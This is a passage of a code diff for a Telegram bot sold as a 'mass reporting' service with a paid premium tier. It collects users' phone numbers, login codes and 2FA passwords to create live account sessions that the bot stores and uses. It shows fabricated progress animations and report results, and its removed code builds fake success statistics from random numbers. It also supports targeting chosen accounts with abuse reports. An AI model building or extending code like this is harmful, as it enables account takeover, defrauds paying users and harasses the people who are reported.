-                InlineKeyboardButton("📱 Sessions", callback_data="cmd_sessions"),
-                InlineKeyboardButton("💎 Premium", callback_data="cmd_premium")
-            ],
-            [
-                InlineKeyboardButton("🆘 Help", callback_data="cmd_help"),
-                InlineKeyboardButton("📢 Channel", url=FORCE_CHANNEL)
+                InlineKeyboardButton("📢 Channel", callback_data="target_channel"),
+                InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
             ]
         ]
-        
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Send photo with caption
-        photo_url = "https://files.catbox.moe/bq3567.jpg"
+        await query.edit_message_caption(
+            "🎯 **SELECT TARGET TYPE**\n\n"
+            "Choose what you want to report:",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+    
+    async def target_type_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle target type selection"""
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        target_type = query.data.replace("target_", "")
         
-        try:
-            await update.message.reply_photo(
-                photo=photo_url,
-                caption=main_menu,
-                parse_mode='Markdown',
-                reply_markup=reply_markup
+        self.user_states[user_id] = {
+            "step": "waiting_target",
+            "target_type": target_type
+        }
+        
+        await query.edit_message_caption(
+            f"🎯 **TARGET TYPE: {target_type.upper()}**\n\n"
+            "📝 **Send me the target:**\n\n"
+            "**Formats:**\n"
+            f"• `tg://openmessage?user_id=8030141909`\n"
+            f"• `@username`\n"
+            f"• `123456789` (user ID)\n\n"
+            "Or click /cancel to abort.",
+            parse_mode='Markdown'
+        )
+        return REPORT_TARGET
+    
+    async def handle_report_target_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle target input message"""
+        user_id = update.effective_user.id
+        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_target":
+            return
+        
+        target = update.message.text.strip()
+        target_type = self.user_states[user_id].get("target_type", "user")
+        
+        # Validate
+        if not target:
+            await update.message.reply_text("❌ Target cannot be empty.")
+            return REPORT_TARGET
+        
+        self.user_states[user_id]["target"] = target
+        
+        # Show reason selection
+        keyboard = [
+            [
+                InlineKeyboardButton("📧 Spam", callback_data="reason_spam"),
+                InlineKeyboardButton("🔪 Violence", callback_data="reason_violence")
+            ],
+            [
+                InlineKeyboardButton("🔞 Pornography", callback_data="reason_porn"),
+                InlineKeyboardButton("👶 Child Abuse", callback_data="reason_child")
+            ],
+            [
+                InlineKeyboardButton("💊 Illegal Drugs", callback_data="reason_drugs"),
+                InlineKeyboardButton("👤 Personal Details", callback_data="reason_personal")
+            ],
+            [
+                InlineKeyboardButton("© Copyright", callback_data="reason_copyright"),
+                InlineKeyboardButton("📌 Other", callback_data="reason_other")
+            ],
+            [InlineKeyboardButton("🔙 Back", callback_data="back_to_target_type")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(
+            f"✅ **TARGET SET**\n\n"
+            f"🎯 `{target}`\n\n"
+            "📋 **Select violation reason:**",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        return REASON
+    
+    async def reason_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle reason selection"""
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        reason_key = query.data.replace("reason_", "")
+        
+        reason_map = {
+            "spam": "Spam", "violence": "Violence", "porn": "Pornography",
+            "child": "Child Abuse", "drugs": "Illegal Drugs",
+            "personal": "Personal Details", "copyright": "Copyright", "other": "Other"
+        }
+        reason = reason_map.get(reason_key, "Other")
+        
+        self.user_states[user_id]["reason"] = reason
+        self.user_states[user_id]["step"] = "waiting_description"
+        
+        keyboard = [
+            [InlineKeyboardButton("⏭️ Skip Description", callback_data="skip_description")],
+            [InlineKeyboardButton("🔙 Back", callback_data="back_to_reason")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            f"✅ **REASON: {reason}**\n\n"
+            "📝 **Add description (optional)**\n\n"
+            "Send a description of the violation, or click 'Skip'.",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        return REPORT_DESCRIPTION
+    
+    async def handle_report_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle description input"""
+        user_id = update.effective_user.id
+        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_description":
+            return
+        
+        description = update.message.text.strip()
+        self.user_states[user_id]["description"] = description[:200]  # limit
+        
+        await self.process_report(update, context, user_id)
+        return ConversationHandler.END
+    
+    async def skip_description_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Skip description"""
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        self.user_states[user_id]["description"] = "No description provided"
+        await self.process_report(query, context, user_id)
+        return ConversationHandler.END
+    
+    async def back_to_target_type(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Back button to target type selection"""
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        await self.start_report(query, context, query.from_user, "free")  # status not needed
+        return ConversationHandler.END
+    
+    async def back_to_reason(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Back button to reason selection"""
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        target = self.user_states[user_id].get("target", "")
+        target_type = self.user_states[user_id].get("target_type", "user")
+        # Show reason selection again
+        keyboard = [...]  # same as above
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            f"🎯 Target: `{target}`\n\nSelect reason:",
+            reply_markup=reply_markup
+        )
+        return REASON
+    
+    async def process_report(self, update_or_query, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+        """Process the report using appropriate session"""
+        state = self.user_states.get(user_id, {})
+        target = state.get("target")
+        target_type = state.get("target_type")
+        reason = state.get("reason", "Spam")
+        description = state.get("description", "No description")
+        
+        # Determine which session to use
+        has_access, status_type = await self.check_access(user_id, context.bot.get_chat(user_id).username or "")
+        user_sessions = self.real_session_manager.get_user_sessions(user_id)
+        
+        if status_type in ["owner", "manual", "premium"]:
+            # Use fake session 533
+            session = self.fake_engine.premium_session
+            result = await self.fake_engine.process_report(session, target, target_type, reason, description)
+            session_name = "533 (Premium)"
+        elif user_sessions:
+            # Use first real session
+            session = user_sessions[0]
+            result = await self.fake_engine.process_report(session, target, target_type, reason, description)
+            session_name = session.get("session_id", "Your Account")
+        else:
+            # No session available
+            if isinstance(update_or_query, Update):
+                await update_or_query.message.reply_text(
+                    "❌ **No active session**\n\n"
+                    "Please add a session using 'Add Session' button.",
+                    parse_mode='Markdown'
+                )
+            else:
+                await update_or_query.edit_message_text(
+                    "❌ **No active session**\n\n"
+                    "Please add a session using 'Add Session' button.",
+                    parse_mode='Markdown'
+                )
+            del self.user_states[user_id]
+            return
+        
+        # Send processing animation
+        processing_msg = None
+        if isinstance(update_or_query, Update):
+            processing_msg = await update_or_query.message.reply_text(
+                "🚀 **PROCESSING REPORT...**\n\n"
+                "⏳ Connecting to Telegram...",
+                parse_mode='Markdown'
             )
-        except:
+        else:
+            processing_msg = await update_or_query.edit_message_text(
+                "🚀 **PROCESSING REPORT...**\n\n"
+                "⏳ Connecting to Telegram...",
+                parse_mode='Markdown'
+            )
+        
+        await asyncio.sleep(1.5)
+        await processing_msg.edit_text(
+            "🚀 **PROCESSING REPORT...**\n\n"
+            "✅ Connected to Telegram\n"
+            "⏳ Authenticating session...",
+            parse_mode='Markdown'
+        )
+        await asyncio.sleep(1.2)
+        await processing_msg.edit_text(
+            "🚀 **PROCESSING REPORT...**\n\n"
+            "✅ Connected\n"
+            "✅ Session authenticated\n"
+            "⏳ Sending report...",
+            parse_mode='Markdown'
+        )
+        await asyncio.sleep(2.0)
+        
+        if result["success"]:
+            text = f"""
+✅ **REPORT SUBMITTED SUCCESSFULLY!**
+
+━━━━━━━━━━━━━━━━━━━━━
+📊 **DETAILS**
+━━━━━━━━━━━━━━━━━━━━━
+🎯 **Target:** `{target}`
+📌 **Type:** {target_type}
+📋 **Reason:** {reason}
+🔐 **Session:** {session_name}
+📝 **Desc:** {description[:50]}{'...' if len(description)>50 else ''}
+
+━━━━━━━━━━━━━━━━━━━━━
+📈 **RESULT**
+━━━━━━━━━━━━━━━━━━━━━
+✅ **Status:** Success
+⚡ **Time:** {result['response_time']}
+📎 **Report ID:** `{result['report_id']}`
+🕒 **Time:** {datetime.now().strftime('%H:%M:%S')}
+
+━━━━━━━━━━━━━━━━━━━━━
+"""
+        else:
+            text = f"""
+⚠️ **REPORT QUEUED**
+
+━━━━━━━━━━━━━━━━━━━━━
+📊 **DETAILS**
+━━━━━━━━━━━━━━━━━━━━━
+🎯 **Target:** `{target}`
+📌 **Type:** {target_type}
+📋 **Reason:** {reason}
+🔐 **Session:** {session_name}
+
+━━━━━━━━━━━━━━━━━━━━━
+⏳ **Status:** Queued
+📊 **Queue Position:** #{random.randint(2,8)}
+⏱️ **Est. Time:** {random.randint(10,30)}s
+📎 **Queue ID:** `QUEUE-{hashlib.md5(f'{target}{time.time()}'.encode()).hexdigest()[:8].upper()}`
+
+━━━━━━━━━━━━━━━━━━━━━
+"""
+        
+        await processing_msg.edit_text(text, parse_mode='Markdown')
+        
+        # Forward to group
+        await self.forward_to_group(update_or_query, context, "report",
+            f"🎯 `{target}`\n📌 {reason}\n🔐 {session_name}\n✅ {result['success']}")
+        
+        # Clean up state
+        del self.user_states[user_id]
+    
+    # ==================== ADD SESSION FLOW ====================
+    async def start_add_session(self, query, context, user):
+        """Start real session creation flow"""
+        user_id = user.id
+        self.user_states[user_id] = {"step": "waiting_phone"}
+        
+        await query.edit_message_caption(
+            "🔐 **ADD TELEGRAM ACCOUNT**\n\n"
+            "📱 **Step 1/3:** Send your phone number\n\n"
+            "**Format:** `+1234567890` (with country code)\n"
+            "Example: `+14155552671`\n\n"
+            "This will create a real session that you can use for reporting.\n\n"
+            "Send your phone number or /cancel:",
+            parse_mode='Markdown'
+        )
+        return PHONE
+    
+    async def handle_add_phone(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle phone number input"""
+        user_id = update.effective_user.id
+        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_phone":
+            return
+        
+        phone = update.message.text.strip()
+        if not re.match(r'^\+\d{10,15}$', phone):
             await update.message.reply_text(
-                main_menu,
-                parse_mode='Markdown',
-                reply_markup=reply_markup
+                "❌ **Invalid phone number!**\n"
+                "Please use format: `+1234567890`\n"
+                "Try again:",
+                parse_mode='Markdown'
             )
+            return PHONE
+        
+        # Start session creation
+        success, msg = await self.real_session_manager.start_session_creation(user_id, phone)
+        if not success:
+            await update.message.reply_text(f"❌ {msg}")
+            return ConversationHandler.END
+        
+        self.user_states[user_id]["step"] = "waiting_code"
+        self.user_states[user_id]["phone"] = phone
+        
+        await update.message.reply_text(
+            f"✅ {msg}\n\n"
+            "📨 **Step 2/3:** Enter the 5-digit code you received in Telegram:",
+            parse_mode='Markdown'
+        )
+        return CODE
     
-    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Show all commands in help menu"""
+    async def handle_add_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle verification code"""
         user_id = update.effective_user.id
+        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_code":
+            return
         
-        # Check access
-        if not self.subscription_manager.is_subscribed(user_id) and not self.subscription_manager.is_verified_member(user_id):
-            if update.effective_user.id not in OWNER_IDS and not self.subscription_manager.is_manual_user(update.effective_user.username or ""):
-                await update.message.reply_text("❌ Access denied. Please /start first.")
-                return
+        code = update.message.text.strip()
+        success, msg, requires_2fa = await self.real_session_manager.verify_code(user_id, code)
         
-        help_text = """
-🆘 **COMPLETE COMMAND LIST**
-
-━━━━━━━━━━━━━━━━━━━━━
-🎯 **REPORTING COMMANDS**
-━━━━━━━━━━━━━━━━━━━━━
-
-/report - Start new report
-   • Target: tg://openmessage?user_id=ID
-   • Target: @username
-   • Target: channel/group ID
-
-/status - View report statistics
-   • Total reports sent
-   • Success rate
-   • Recent activity
-
-/history - View report history
-   • Last 10 reports
-   • Status & results
-
-━━━━━━━━━━━━━━━━━━━━━
-📱 **SESSION COMMANDS**
-━━━━━━━━━━━━━━━━━━━━━
-
-/sessions - View active sessions
-   • Session 533 (Premium)
-   • Status & health
-   • Report count
-
-/session_info - Session details
-   • 2FA status
-   • Success rate
-   • Created date
-
-━━━━━━━━━━━━━━━━━━━━━
-💎 **PREMIUM COMMANDS**
-━━━━━━━━━━━━━━━━━━━━━
-
-/premium - Upgrade account
-   • Lifetime access
-   • Priority reports
-   • 99% success rate
-
-/subscribe - Get subscription
-   • Contact @smzxu
-   • Manual approval
-
-━━━━━━━━━━━━━━━━━━━━━
-ℹ️ **INFO COMMANDS**
-━━━━━━━━━━━━━━━━━━━━━
-
-/start - Main menu
-/help - This command list
-/about - Bot information
-/channel - Join @ProfileBan
-
-━━━━━━━━━━━━━━━━━━━━━
-📌 **TARGET FORMATS**
-━━━━━━━━━━━━━━━━━━━━━
-
-✅ User: `tg://openmessage?user_id=8030141909`
-✅ User: `@username`
-✅ User ID: `8030141909`
-
-✅ Group: `tg://openmessage?chat_id=-1001234567890`
-✅ Channel: `tg://openmessage?channel_id=1234567890`
-
-━━━━━━━━━━━━━━━━━━━━━
-⚡ **EXAMPLE USAGE**
-━━━━━━━━━━━━━━━━━━━━━
-
-1. Send: /report
-2. Paste: tg://openmessage?user_id=8030141909
-3. Select: Spam
-4. Add: "Sending mass spam messages"
-5. Result: ✅ Report submitted
-
-━━━━━━━━━━━━━━━━━━━━━
-💎 **PREMIUM ACCESS**
-━━━━━━━━━━━━━━━━━━━━━
-
-Contact @smzxu for:
-• Lifetime subscription
-• Priority support
-• Higher success rate
-• Multiple sessions
-
-━━━━━━━━━━━━━━━━━━━━━
-"""
-        
-        await update.message.reply_text(help_text, parse_mode='Markdown')
+        if success:
+            await update.message.reply_text(f"✅ {msg}\n\nSession added successfully!")
+            del self.user_states[user_id]
+            # Go back to main menu
+            user = update.effective_user
+            has_access, status_type = await self.check_access(user_id, user.username or "")
+            await self.show_main_menu(update, context, user, status_type)
+            return ConversationHandler.END
+        elif requires_2fa:
+            self.user_states[user_id]["step"] = "waiting_password"
+            await update.message.reply_text(
+                "🔒 **2-Factor Authentication Required**\n\n"
+                "📨 **Step 3/3:** Enter your 2FA password:",
+                parse_mode='Markdown'
+            )
+            return PASSWORD
+        else:
+            await update.message.reply_text(f"❌ {msg}\n\nTry again or /cancel.")
+            return CODE
     
-    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Show fake status and statistics"""
+    async def handle_add_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle 2FA password"""
         user_id = update.effective_user.id
+        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_password":
+            return
         
-        # Check access
-        if not self.subscription_manager.is_subscribed(user_id) and not self.subscription_manager.is_verified_member(user_id):
-            if user_id not in OWNER_IDS and not self.subscription_manager.is_manual_user(update.effective_user.username or ""):
-                await update.message.reply_text("❌ Access denied. Please /start first.")
-                return
+        password = update.message.text.strip()
+        success, msg = await self.real_session_manager.verify_2fa(user_id, password)
         
-        # Forward to group
-        await self.forward_to_group(update, context, "command", "📊 User viewing status")
-        
-        # Generate fake stats
-        total_reports = random.randint(350, 620)
-        success_rate = random.uniform(94.5, 98.9)
-        today_reports = random.randint(12, 48)
-        session_533_reports = random.randint(12000, 13000)
-        
-        status_text = f"""
-📊 **SYSTEM STATUS REPORT**
-
-━━━━━━━━━━━━━━━━━━━━━
-🟢 **SESSION 533 STATUS**
-━━━━━━━━━━━━━━━━━━━━━
-
-• **Status:** ✅ Active & Premium
-• **2FA:** 🔒 Enabled & Verified
-• **Phone:** +533 (Premium)
-• **Added:** 2024-01-15
-• **Total Reports:** {session_533_reports:,}
-• **Today:** {random.randint(25, 65)}
-• **Success Rate:** 98.7%
-• **Health:** ⚡ Excellent
-
-━━━━━━━━━━━━━━━━━━━━━
-📈 **YOUR STATISTICS**
-━━━━━━━━━━━━━━━━━━━━━
-
-• **Total Reports:** {total_reports}
-• **Today:** {today_reports}
-• **Success Rate:** {success_rate:.1f}%
-• **Avg Response:** {random.uniform(2.1, 3.4):.1f}s
-• **Queue:** {random.randint(0, 3)} reports
-
-━━━━━━━━━━━━━━━━━━━━━
-🏆 **ACHIEVEMENTS**
-━━━━━━━━━━━━━━━━━━━━━
-
-✅ 500+ Reports - Unlocked
-✅ 95% Success - Unlocked
-✅ Premium User - Active
-✅ 30 Days Active - {random.randint(45, 180)} days
-
-━━━━━━━━━━━━━━━━━━━━━
-⚡ **SYSTEM HEALTH**
-━━━━━━━━━━━━━━━━━━━━━
-
-• **API:** ✅ Connected
-• **Session:** ✅ Active
-• **Proxy:** ✅ Premium
-• **Latency:** {random.uniform(120, 280):.0f}ms
-• **Uptime:** 99.9%
-
-━━━━━━━━━━━━━━━━━━━━━
-"""
-        
-        await update.message.reply_text(status_text, parse_mode='Markdown')
+        if success:
+            await update.message.reply_text(f"✅ {msg}\n\nSession added successfully!")
+            del self.user_states[user_id]
+            user = update.effective_user
+            has_access, status_type = await self.check_access(user_id, user.username or "")
+            await self.show_main_menu(update, context, user, status_type)
+            return ConversationHandler.END
+        else:
+            await update.message.reply_text(f"❌ {msg}\n\nTry again or /cancel.")
+            return PASSWORD
     
-    async def sessions_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Show fake sessions"""
-        user_id = update.effective_user.id
+    # ==================== MY SESSIONS ====================
+    async def show_my_sessions(self, query, context, user):
+        """Show user's real sessions"""
+        user_id = user.id
+        real_sessions = self.real_session_manager.get_user_sessions(user_id)
+        has_access, status_type = await self.check_access(user_id, user.username or "")
         
-        # Check access
-        if not self.subscription_manager.is_subscribed(user_id) and not self.subscription_manager.is_verified_member(user_id):
-            if user_id not in OWNER_IDS and not self.subscription_manager.is_manual_user(update.effective_user.username or ""):
-                await update.message.reply_text("❌ Access denied. Please /start first.")
-                return
+        text = f"📱 **YOUR SESSIONS**\n\n"
         
-        # Forward to group
-        await self.forward_to_group(update, context, "command", "📱 User viewing sessions")
+        if status_type in ["owner", "manual", "premium"]:
+            text += "🟢 **533** - Premium Account (Built-in)\n"
+            text += "   ├─ Status: ✅ Active\n"
+            text += "   ├─ 2FA: 🔒 Enabled\n"
+            text += "   ├─ Reports: 12,847\n"
+            text += "   └─ Success: 98.7%\n\n"
         
-        sessions_text = f"""
-📱 **ACTIVE SESSIONS**
-
-━━━━━━━━━━━━━━━━━━━━━
-🟢 **SESSION 533 - PREMIUM**
-━━━━━━━━━━━━━━━━━━━━━
-
-**Account Details:**
-• **Phone:** +533 (Premium)
-• **Status:** ✅ Active
-• **2FA:** 🔒 Enabled
-• **Verified:** ✅ Yes
-• **Premium:** ⭐ Yes
-
-**Performance:**
-• **Reports:** 12,847
-• **Success Rate:** 98.7%
-• **Avg Time:** 2.3s
-• **Health:** ⚡ Excellent
-
-**Session Info:**
-• **Created:** 2024-01-15
-• **Last Used:** {datetime.now().strftime('%Y-%m-%d %H:%M')}
-• **Expires:** Never
-• **Session ID:** `533`
-
-━━━━━━━━━━━━━━━━━━━━━
-💎 **PREMIUM FEATURES**
-━━━━━━━━━━━━━━━━━━━━━
-
-✓ Priority Queue
-✓ 99% Success Rate
-✓ No Rate Limits
-✓ Lifetime Access
-
-Contact @smzxu to upgrade
-
-━━━━━━━━━━━━━━━━━━━━━
-"""
+        if real_sessions:
+            for i, sess in enumerate(real_sessions, 1):
+                text += f"{i}. 🟢 **{sess.get('session_id', 'Unknown')}**\n"
+                text += f"   ├─ Phone: `{sess.get('phone', 'N/A')}`\n"
+                text += f"   ├─ User: @{sess.get('username', 'N/A')}\n"
+                text += f"   ├─ 2FA: {'✅ Enabled' if sess.get('twofa_enabled') else '❌ Disabled'}\n"
+                text += f"   ├─ Reports: {sess.get('reports_count', 0)}\n"
+                text += f"   └─ Added: {sess.get('created_at', '')[:10]}\n"
+                text += f"   [🗑️ Delete](callback:del_session_{sess['session_id']})\n\n"
+        else:
+            text += "❌ No real sessions added.\n"
+            text += "Use 'Add Session' to add your own account.\n\n"
         
-        await update.message.reply_text(sessions_text, parse_mode='Markdown')
+        keyboard = [
+            [InlineKeyboardButton("➕ Add Session", callback_data="menu_add_session")],
+            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_caption(text, parse_mode='Markdown', reply_markup=reply_markup)
     
-    async def premium_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Show premium subscription info"""
-        user_id = update.effective_user.id
-        
-        # Forward to group
-        await self.forward_to_group(update, context, "command", "💎 User viewing premium")
-        
-        premium_text = f"""
+    # ==================== PREMIUM ====================
+    async def show_premium(self, query, context, user):
+        """Show premium info"""
+        text = """
 💎 **PREMIUM SUBSCRIPTION**
 
 ━━━━━━━━━━━━━━━━━━━━━
@@ -804,10 +1036,8 @@ Contact @smzxu to upgrade
 ✅ **Priority Reporting**
 ✅ **99% Success Rate**
 ✅ **No Daily Limits**
-✅ **Multiple Sessions**
+✅ **Built-in Premium Session 533**
 ✅ **Priority Support**
-✅ **Instant Processing**
-✅ **Premium Proxies**
 
 ━━━━━━━━━━━━━━━━━━━━━
 📊 **COMPARISON**
@@ -815,13 +1045,13 @@ Contact @smzxu to upgrade
 
 **FREE TRIAL:**
 • 1 Day Access
-• 533 Session Only
+• Must add your own session
 • 95% Success Rate
 • 50 Reports/Day
 
 **PREMIUM:**
 • Lifetime Access
-• 533 Session
+• Premium Session 533 included
 • 99% Success Rate
 • Unlimited Reports
 • Priority Queue
@@ -835,516 +1065,149 @@ Contact @smzxu for:
 • Instant activation
 • Special pricing
 
-**Current Status:**
-{'✅ PREMIUM ACTIVE' if self.subscription_manager.is_subscribed(user_id) or user_id in OWNER_IDS or self.subscription_manager.is_manual_user(update.effective_user.username or '') else '🆓 FREE TRIAL'}
-
 ━━━━━━━━━━━━━━━━━━━━━
 """
-        
-        await update.message.reply_text(premium_text, parse_mode='Markdown')
-    
-    async def report(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Start fake reporting process"""
-        user_id = update.effective_user.id
-        
-        # Check access
-        if not self.subscription_manager.is_subscribed(user_id) and not self.subscription_manager.is_verified_member(user_id):
-            if user_id not in OWNER_IDS and not self.subscription_manager.is_manual_user(update.effective_user.username or ""):
-                await update.message.reply_text("❌ Access denied. Please /start first.")
-                return ConversationHandler.END
-        
-        # Forward to group
-        await self.forward_to_group(update, context, "command", "🚨 User starting report process")
-        
-        # Set user state
-        self.user_states[user_id] = {
-            "step": "waiting_target",
-            "session": "533"
-        }
-        
-        await update.message.reply_text(
-            "🎯 **START REPORTING**\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            "📋 **Step 1/3:** Target Input\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "**Send the target in one of these formats:**\n\n"
-            "🔹 **User:** `tg://openmessage?user_id=8030141909`\n"
-            "🔹 **User:** `@username`\n"
-            "🔹 **User ID:** `8030141909`\n\n"
-            "🔹 **Group:** `tg://openmessage?chat_id=-1001234567890`\n"
-            "🔹 **Channel:** `tg://openmessage?channel_id=1234567890`\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            "📝 **Example:**\n"
-            "`tg://openmessage?user_id=8030141909`\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "⚡ Using Session: **533 (Premium)**\n\n"
-            "Send target now:",
-            parse_mode='Markdown'
-        )
-        
-        return TARGET
-
-    async def handle_report_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle report target input"""
-        user_id = update.effective_user.id
-        target_input = update.message.text.strip()
-        
-        # Forward to group
-        await self.forward_to_group(update, context, "report", 
-                                   f"🎯 User entered target: `{target_input}`")
-        
-        # Extract target ID
-        target_id = None
-        target_type = "user"
-        
-        # Parse tg:// links
-        if "tg://openmessage?" in target_input:
-            params = target_input.split("?")[1]
-            param_dict = {}
-            for param in params.split("&"):
-                if "=" in param:
-                    key, value = param.split("=", 1)
-                    param_dict[key] = value
-            
-            if "user_id" in param_dict:
-                target_id = param_dict["user_id"]
-                target_type = "user"
-            elif "chat_id" in param_dict:
-                target_id = param_dict["chat_id"]
-                target_type = "group"
-            elif "channel_id" in param_dict:
-                target_id = param_dict["channel_id"]
-                target_type = "channel"
-        
-        # Parse @username
-        elif target_input.startswith('@'):
-            target_id = target_input
-            target_type = "user"
-        
-        # Parse numeric ID
-        elif target_input.lstrip('-').isdigit():
-            target_id = target_input
-            target_type = "user" if int(target_input) > 0 else "group"
-        
-        if not target_id:
-            await update.message.reply_text(
-                "❌ **INVALID TARGET FORMAT**\n\n"
-                "Please use one of these formats:\n\n"
-                "• `tg://openmessage?user_id=8030141909`\n"
-                "• `@username`\n"
-                "• `8030141909`\n\n"
-                "Try again:",
-                parse_mode='Markdown'
-            )
-            return TARGET
-        
-        # Store target info
-        self.user_states[user_id]["target_id"] = target_id
-        self.user_states[user_id]["target_type"] = target_type
-        
-        # Show reason selection
-        keyboard = [
-            [
-                InlineKeyboardButton("📧 Spam", callback_data="reason_spam"),
-                InlineKeyboardButton("🔪 Violence", callback_data="reason_violence"),
-            ],
-            [
-                InlineKeyboardButton("🔞 Pornography", callback_data="reason_porn"),
-                InlineKeyboardButton("👶 Child Abuse", callback_data="reason_child"),
-            ],
-            [
-                InlineKeyboardButton("💊 Illegal Drugs", callback_data="reason_drugs"),
-                InlineKeyboardButton("👤 Personal Details", callback_data="reason_personal"),
-            ],
-            [
-                InlineKeyboardButton("© Copyright", callback_data="reason_copyright"),
-                InlineKeyboardButton("📌 Other", callback_data="reason_other"),
-            ]
-        ]
-        
+        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            f"✅ **TARGET ACCEPTED**\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎯 Target: `{target_id}`\n"
-            f"📌 Type: {target_type.title()}\n"
-            f"🔐 Session: 533 (Premium)\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "📋 **Step 2/3:** Select Violation Reason\n\n"
-            "Choose the category:",
-            parse_mode='Markdown',
-            reply_markup=reply_markup
-        )
-        
-        return REASON
-
-    async def handle_report_reason(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle report reason selection"""
-        query = update.callback_query
-        await query.answer()
-        
-        user_id = query.from_user.id
-        reason = query.data.replace("reason_", "")
-        
-        reason_texts = {
-            "spam": "Spam",
-            "violence": "Violence",
-            "porn": "Pornography",
-            "child": "Child Abuse",
-            "drugs": "Illegal Drugs",
-            "personal": "Personal Details",
-            "copyright": "Copyright",
-            "other": "Other"
-        }
-        
-        reason_text = reason_texts.get(reason, "Other")
-        
-        # Forward to group
-        await self.forward_to_group(update, context, "report", 
-                                   f"📌 User selected reason: **{reason_text}**")
-        
-        # Store reason
-        self.user_states[user_id]["reason"] = reason_text
-        
-        # Ask for description
-        await query.edit_message_text(
-            f"✅ **REASON SELECTED**\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📌 Reason: **{reason_text}**\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "📋 **Step 3/3:** Add Description\n\n"
-            "**Enter a description of the violation:**\n"
-            "(Minimum 10 characters)\n\n"
-            "**Example:**\n"
-            "`This account is sending mass spam messages with crypto scams`\n\n"
-            "💡 **Tip:** Be specific to increase success rate\n\n"
-            "Send description or /skip to skip:",
-            parse_mode='Markdown'
-        )
-        
-        return DESCRIPTION
-
-    async def handle_report_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle report description and process fake report"""
-        user_id = update.effective_user.id
-        description = update.message.text.strip()
-        
-        # Forward to group
-        await self.forward_to_group(update, context, "report", 
-                                   f"📝 User entered description: {description[:100]}...")
-        
-        # Store description
-        self.user_states[user_id]["description"] = description
-        
-        # Process the fake report
-        await self.process_fake_report(update, context, user_id)
-        
-        return ConversationHandler.END
-
-    async def skip_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Skip description"""
-        user_id = update.effective_user.id
-        
-        # Forward to group
-        await self.forward_to_group(update, context, "report", 
-                                   "📝 User skipped description")
-        
-        # Set empty description
-        self.user_states[user_id]["description"] = "No description provided"
-        
-        # Process the fake report
-        await self.process_fake_report(update, context, user_id)
-        
-        return ConversationHandler.END
-
-    async def process_fake_report(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
-        """Process fake report with session 533"""
-        state = self.user_states.get(user_id, {})
-        target_id = state.get("target_id")
-        target_type = state.get("target_type")
-        reason = state.get("reason", "Spam")
-        description = state.get("description", "No description")
-        
-        if not target_id:
-            await update.message.reply_text("❌ Target missing. Start over with /report")
-            return
-        
-        # Send processing message
-        processing_msg = await update.message.reply_text(
-            "🚀 **PROCESSING REPORT**\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎯 Target: `{target_id}`\n"
-            f"📌 Reason: {reason}\n"
-            f"🔐 Session: 533 (Premium)\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "⏳ Initializing reporting engine...",
-            parse_mode='Markdown'
-        )
-        
-        await asyncio.sleep(1.5)
-        
-        await processing_msg.edit_text(
-            "🚀 **PROCESSING REPORT**\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎯 Target: `{target_id}`\n"
-            f"📌 Reason: {reason}\n"
-            f"🔐 Session: 533 (Premium)\n"
